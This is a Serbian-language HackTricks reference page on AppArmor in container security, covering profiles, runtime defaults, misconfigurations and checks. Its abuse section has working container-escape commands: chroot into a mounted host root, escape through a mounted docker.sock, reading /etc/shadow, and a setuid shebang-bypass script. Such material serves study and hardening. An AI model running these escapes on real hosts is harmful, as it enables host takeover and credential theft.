# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Pregled

AppArmor je sistem **obavezne kontrole pristupa** koji primenjuje ograničenja preko profila po programu. Za razliku od tradicionalnih DAC provera, koje u velikoj meri zavise od vlasništva korisnika i grupa, AppArmor omogućava kernelu da sprovede politiku vezanu direktno za sam proces. U okruženjima sa kontejnerima ovo je važno zato što radno opterećenje može imati dovoljno tradicionalnih privilegija da pokuša neku akciju, a da mu ipak bude odbijeno jer njegov AppArmor profil ne dozvoljava odgovarajuću putanju, mount, mrežno ponašanje ili korišćenje capability-ja.

Najvažnija konceptualna tačka je da je AppArmor **zasnovan na putanjama**. On razmatra pristup datotečnom sistemu kroz pravila zasnovana na putanjama umesto kroz etikete kao što to radi SELinux. To ga čini pristupačnim i moćnim, ali takođe znači da bind mountovi i alternativne raspodele putanja zaslužuju pažnju. Ako ista sadržina hosta postane dostupna preko druge putanje, efekat politike možda neće biti onakav kakav je operater prvo očekivao.

## Uloga u izolaciji kontejnera

Pregledi bezbednosti kontejnera često se zaustavljaju na capability-ima i seccomp-u, ali AppArmor ostaje važan i posle tih provera. Zamislite kontejner koji ima više privilegija nego što bi trebao, ili workload kojem je iz operativnih razloga potrebna još jedna capability. AppArmor i dalje može ograničiti pristup fajlovima, ponašanje pri mount-ovanju, umrežavanje i obrasce izvršavanja na načine koji zaustavljaju očigledni put zloupotrebe. Zato onemogućavanje AppArmor-a "samo da bi aplikacija radila" može tiho pretvoriti konfiguraciju koja je samo rizična u onu koja je aktivno iskorišćiva.

## Lab

Da biste proverili da li je AppArmor aktivan na hostu, koristite:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Da biste videli pod kojim nalogom radi trenutni process u containeru:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
Razlika je poučna. U normalnom slučaju, proces bi trebalo da prikaže AppArmor kontekst povezan sa profilom koji je izabrao runtime. U slučaju unconfined, taj dodatni sloj ograničenja nestaje.

Takođe možete proveriti šta je Docker smatrao da je primenio:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Korišćenje tokom izvršavanja

Docker može primeniti podrazumevani ili prilagođeni AppArmor profil kada domaćin to podržava. Podman se takođe može integrisati sa AppArmor na sistemima zasnovanim na AppArmor-u, iako na distribucijama koje prvo koriste SELinux često drugi MAC sistem preuzme glavnu ulogu. Kubernetes može izložiti AppArmor politiku na nivou workload-a na čvorovima koji zapravo podržavaju AppArmor. LXC i srodna Ubuntu-family system-container okruženja takođe široko koriste AppArmor.

Bitno je da AppArmor nije "Docker feature". To je mogućnost kernela domaćina koju nekoliko runtimes može da primeni. Ako domaćin to ne podržava ili je runtime podešen da radi unconfined, pretpostavljena zaštita zapravo ne postoji.

Na AppArmor domaćinima koji podržavaju Docker, najpoznatiji podrazumevani profil je `docker-default`. That profile is generated from Moby's AppArmor template and is important because it explains why some capability-based PoCs still fail in a default container. U širokim crtama, `docker-default` dozvoljava uobičajeno networking, odbija upise u velikom delu `/proc`, uskraćuje pristup osetljivim delovima od `/sys`, blokira mount operacije i ograničava ptrace tako da on nije opšti primitiv za sondiranje hosta. Razumevanje te osnovne postavke pomaže da se razgraniči "the container has `CAP_SYS_ADMIN`" od "the container can actually use that capability against the kernel interfaces I care about".

## Upravljanje profilima

AppArmor profili se obično nalaze pod `/etc/apparmor.d/`. Uobičajena konvencija imenovanja je da se kosine crte u putanji izvršnog fajla zamene tačkama. Na primer, profil za `/usr/bin/man` se obično čuva kao `/etc/apparmor.d/usr.bin.man`. Ovaj detalj je važan i za odbranu i za procenu jer kada znate aktivno ime profila, često možete brzo pronaći odgovarajući fajl na domaćinu.

Korisne komande za upravljanje na strani domaćina uključuju:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
Razlog zašto su ove komande važne u referenci o bezbednosti kontejnera jeste što objašnjavaju kako se profili zapravo kreiraju, učitavaju, prebacuju u complain mode i menjaju nakon promena u aplikaciji. Ako operater ima naviku da tokom rešavanja problema prebacuje profile u complain mode i zaboravi da vrati enforcement, kontejner može izgledati zaštićeno u dokumentaciji, dok u stvarnosti radi znatno slobodnije.

### Kreiranje i ažuriranje profila

`aa-genprof` can observe application behavior and help generate a profile interactively:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` može generisati šablon profila koji se kasnije može učitati pomoću `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Kada se binarni fajl promeni i politika treba da se ažurira, `aa-logprof` može reproducirati odbijanja pronađena u logovima i pomoći operateru da odluči da li da ih dozvoli ili odbije:
```bash
sudo aa-logprof
```
### Dnevnici

AppArmor-ova odbijanja su često vidljiva putem `auditd`, syslog ili alata kao što je `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Ovo je korisno operativno i ofanzivno. Odbrambeni timovi to koriste za doradu profila. Napadači to koriste da saznaju koji tačan put ili operacija se odbija i da li je AppArmor kontrola koja blokira lanac eksploatacije.

### Identifikovanje tačne datoteke profila

Kada runtime prikaže konkretno ime AppArmor profila za kontejner, često je korisno mapirati to ime nazad na datoteku profila na disku:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Ovo je posebno korisno tokom pregleda na hostu, jer premošćuje jaz između "kontejner kaže da radi pod profilom `lowpriv`" i "stvarna pravila se nalaze u ovom konkretnom fajlu koji može biti auditovan ili ponovo učitan".

## Neispravne konfiguracije

Najočiglednija greška je `apparmor=unconfined`. Administratori je često postave dok otklanjaju greške u aplikaciji koja nije radila zato što je profil ispravno blokirao nešto opasno ili neočekivano. Ako zastavica ostane u produkciji, čitav MAC sloj je efektivno uklonjen.

Drugi suptilan problem je pretpostavka da su bind mounts bezopasni jer dozvole fajlova deluju normalno. Pošto je AppArmor baziran na putanjama, izlaganje host putanja pod alternativnim mount lokacijama može loše uticati na pravila za putanje. Treća greška je zaboraviti da ime profila u konfiguracionom fajlu znači vrlo malo ako host kernel zapravo ne primenjuje AppArmor.

## Zloupotreba

Kada AppArmor nije prisutan, operacije koje su ranije bile ograničene mogu iznenada početi da rade: čitanje osetljivih putanja putem bind mounts, pristup delovima procfs ili sysfs koji bi trebalo da ostanu teži za upotrebu, izvođenje mount-povezanih akcija ako capabilities/seccomp to takođe dozvoljavaju, ili korišćenje putanja koje bi profil normalno odbio. AppArmor je često mehanizam koji objašnjava zašto capability-based breakout attempt "should work" na papiru, ali i dalje ne uspeva u praksi. Uklonite AppArmor, i isti pokušaj može početi uspevati.

Ako sumnjate da je AppArmor glavni razlog koji zaustavlja path-traversal, bind-mount, ili mount-based abuse chain, prvi korak je obično da uporedite šta postaje dostupno sa profilom i bez njega. Na primer, ako je host putanja mountovana unutar kontejnera, počnite proverom da li možete da je pređete i pročitate:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Ako kontejner takođe ima opasnu capability kao što je `CAP_SYS_ADMIN`, jedan od najpraktičnijih testova je proveriti da li AppArmor blokira mount operacije ili pristup osetljivim kernel fajl-sistemima:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
U okruženjima gde je host path već dostupan kroz bind mount, gubitak AppArmor-a može takođe pretvoriti problem otkrivanja informacija samo za čitanje u direktan pristup fajlovima hosta:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
Poenta ovih komandi nije da AppArmor sam stvara breakout. Radi se o tome da, kada se AppArmor ukloni, mnogi filesystem i mount-based putevi zloupotrebe postaju odmah testabilni.

### Potpun primer: AppArmor Disabled + Host Root Mounted

Ako container već ima host root bind-mounted na `/host`, uklanjanjem AppArmor-a blokirani filesystem put zloupotrebe može se pretvoriti u kompletan host escape:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Kada se shell izvršava kroz host datotečni sistem, workload je efektivno pobegao iz granice kontejnera:
```bash
id
hostname
cat /etc/shadow | head
```
### Kompletan primer: AppArmor onemogućen + Runtime Socket

Ako je stvarna prepreka AppArmor oko runtime stanja, montirani socket može biti dovoljan za potpuno bekstvo iz containera:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Tačan put zavisi od mount point-a, ali krajnji rezultat je isti: AppArmor više ne sprečava pristup runtime API-ju, pa runtime API može pokrenuti kontejner koji može kompromitovati host.

### Potpun primer: Path-Based Bind-Mount Bypass

Pošto je AppArmor zasnovan na putanjama, zaštita `/proc/**` ne štiti automatski isti host procfs sadržaj kada mu se pristupi kroz drugačiju putanju:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
Uticaj zavisi od toga šta je tačno montirano i da li alternativni put takođe zaobilazi druge kontrole, ali ovaj obrazac je jedan od najočiglednijih razloga zbog kojih AppArmor mora biti procenjen zajedno sa rasporedom montiranja, a ne izolovano.

### Potpun primer: Shebang Bypass

AppArmor politika ponekad cilja putanju interpretera na način koji ne uzima u potpunosti u obzir izvršavanje skripti kroz shebang handling. Istorijski primer uključivao je korišćenje skripta čija prva linija upućuje na ograničenog interpretera:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Ovakav primer je važan kao podsetnik da namera profila i stvarne semantike izvršavanja mogu da se razilaze. Pri pregledu AppArmor u kontejnerskim okruženjima, lanci interpretera i alternativni putevi izvršavanja zaslužuju posebnu pažnju.

## Provere

Cilj ovih provera je da brzo odgovori na tri pitanja: da li je AppArmor omogućen na hostu, da li je trenutni proces ograničen i da li je runtime zaista primenio profil na ovaj kontejner?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
Šta je zanimljivo ovde:

- Ako `/proc/self/attr/current` prikazuje `unconfined`, workload ne koristi AppArmor confinement.
- Ako `aa-status` prikazuje AppArmor onemogućen ili nije učitan, bilo koji naziv profila u runtime konfiguraciji je uglavnom kozmetički.
- Ako `docker inspect` prikazuje `unconfined` ili neočekivani custom profil, to je često razlog zbog kojeg filesystem- ili mount-based abuse path funkcioniše.

Ako kontejner već ima povišene privilegije iz operativnih razloga, ostavljanje AppArmor omogućenog često čini razliku između kontrolisanog izuzetka i mnogo šire sigurnosne propasti.

## Runtime Defaults

| Runtime / platform | Podrazumevano stanje | Podrazumevano ponašanje | Uobičajeno ručno slabljenje |
| --- | --- | --- | --- |
| Docker Engine | Podrazumevano omogućeno na hostovima koji podržavaju AppArmor | Koristi `docker-default` AppArmor profil osim ako nije nadjačano | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Zavisi od hosta | AppArmor se podržava putem `--security-opt`, ali tačan podrazumevani režim zavisi od hosta/runtime-a i manje je univerzalan nego Dockerov dokumentovani `docker-default` profil | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Uslovno podrazumevano | Ako `appArmorProfile.type` nije naveden, podrazumevano je `RuntimeDefault`, ali se primenjuje samo kada je AppArmor omogućen na čvoru | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` sa slabim profilom, čvorovi bez podrške za AppArmor |
| containerd / CRI-O under Kubernetes | Zavisi od podrške čvora/runtime-a | Uobičajeni runtime-i podržani u Kubernetesu podržavaju AppArmor, ali stvarno sprovođenje zavisi od podrške čvora i podešavanja workload-a | Isto što i red za Kubernetes; direktna konfiguracija runtime-a takođe može potpuno zaobići AppArmor |

Za AppArmor, najvažnija promenljiva je često **host**, ne samo runtime. Podešavanje profila u manifestu ne stvara ograničenje na čvoru gde AppArmor nije omogućen.
{{#include ../../../../banners/hacktricks-training.md}}
